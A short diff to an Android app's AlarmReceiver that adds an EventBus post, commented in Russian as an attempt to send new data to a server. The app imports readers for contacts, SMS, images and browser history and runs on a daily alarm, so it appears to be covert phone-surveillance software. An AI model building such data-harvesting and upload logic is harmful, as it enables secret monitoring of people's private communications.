@@ -14,10 +14,13 @@ import android.os.Environment;
 import android.util.Log;
 
 import com.postal.omniscient.postal.adapter.AdapterData;
+import com.postal.omniscient.postal.adapter.EventBusData;
 import com.postal.omniscient.postal.browser.history.BrowserHistory;
 import com.postal.omniscient.postal.reader.contact.ReadContacts;
 import com.postal.omniscient.postal.reader.image.AllImages;
 import com.postal.omniscient.postal.reader.sms.ReadSms;
+
+import org.greenrobot.eventbus.EventBus;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -67,7 +70,7 @@ public class AlarmReceiver extends BroadcastReceiver {
             alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*60*24, pendingIntent);
         }
 
-
+        EventBus.getDefault().post(new EventBusData("allfile"));// если есть коннект пробуем отправить новые данные на сервер
     }
 
     private void saveIMAGE(Context context, ContentResolver contentResolver) {
